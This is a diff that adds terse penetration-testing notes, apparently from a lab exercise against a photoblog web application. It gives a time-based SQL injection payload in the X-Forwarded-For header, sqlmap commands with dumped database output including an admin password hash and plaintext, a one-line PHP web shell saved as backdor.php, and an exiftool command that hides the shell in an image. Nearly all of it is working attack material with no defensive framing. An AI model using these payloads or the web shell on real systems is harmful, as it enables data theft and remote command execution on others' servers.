@@ -1,0 +1,120 @@
+=================
+ Time Based SQLi 
+=================
+
+- x-forwarded-for: 1' and sleep(1)='
+
+::: Header Before Injection :::
+Host: 10.0.0.10
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+
+::: Header After Injection :::
+
+Host: 10.0.0.10
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+x-forwarded-for: 1' and sleep(1000000)='      <<< Injection >>>
+Connection: keep-alive
+
+
+=======================
+Automating with Sqlmap
+=======================
+
+- sqlmap -u "http://victim_ip/vulnmodule.php?id=2-" --headers="X-Forwarded-For: *" --dbs
+
+available databases [2]:
+[*] information_schema
+[*] photoblog
+
+- sqlmap -u "http://victim_ip/vulnmodule.php?id=2-" --headers="X-Forwarded-For: *" -D photoblog --dump
+
+Database: photoblog
+Table: pictures
+[3 entries]
++----+-----+-------------+---------+
+| id | cat | img         | title   |
++----+-----+-------------+---------+
+| 1  | 2   | hacker.png  | Hacker  |
+| 2  | 1   | ruby.jpg    | Ruby    |
+| 3  | 1   | cthulhu.png | Cthulhu |
++----+-----+-------------+---------+
+
+- sqlmap -u "http://victim_ip/vulnmodule.php?id=2-" --headers="X-Forwarded-For: *" -D photoblog -T users --dump
+
+Database: photoblog
+Table: users
+[1 entry]
++----+-------+---------------------------------------------+
+| id | login | password                                    |
++----+-------+---------------------------------------------+
+| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
++----+-------+---------------------------------------------+
+
+Database: photoblog
+Table: categories
+[3 entries]
++----+--------+
+| id | title  |
++----+--------+
+| 1  | test   |
+| 2  | ruxcon |
+| 3  | 2010   |
++----+--------+
+
+
+===================
+ Uploading a Shell
+===================
+
+<?php $cmd=$_GET ['cmd']; system ($cmd); ?>
+
+----- File Name -----
+     backdor.php
+---------------------
+
+===========================
+ Inecting php into an img
+===========================
+
+- exiftool  "-ccoment <=backdor.php" logo.png
+
+
+Database: photoblog
+Table: stats
+[22 entries]
++----------------------+---------+
+| ip                   | count   |
++----------------------+---------+
+| <blank>              | 1       |
+| (SELECT (CASE WHEN ( | 1       |
+| (SELECT (CHR(113)||C | 1       |
+| (SELECT 5000 FROM(SE | 1       |
+| (SELECT CHAR(113)+CH | 1       |
+| (SELECT CONCAT(0x716 | 1       |
+| ) AND (SELECT * FROM | 1       |
+| ) AND (SELECT 4283 F | 1       |
+| ) AND 1413=CONVERT(I | 1       |
+| ) AND 2562=2562 AND  | 1       |
+| ) AND 3600=(SELECT U | 1       |
+| ) AND 8039=7125 AND  | 1       |
+| ) AND 9514=CAST((CHR | 1       |
+| );(SELECT * FROM (SE | 1       |
+| );SELECT DBMS_PIPE.R | 1       |
+| );SELECT PG_SLEEP(5) | 1       |
+| 0                    | 1       |
+| 1                    | 3       |
+| 10.0.0.13            | 1180    |
+| 10.0.0.8             | 20      |
+| 9618                 | 1       |
+| ;(SELECT * FROM (SEL | 1       |
++----------------------+---------+
+
+
+https://www.youtube.com/watch?v=sGKFBTS_M3o
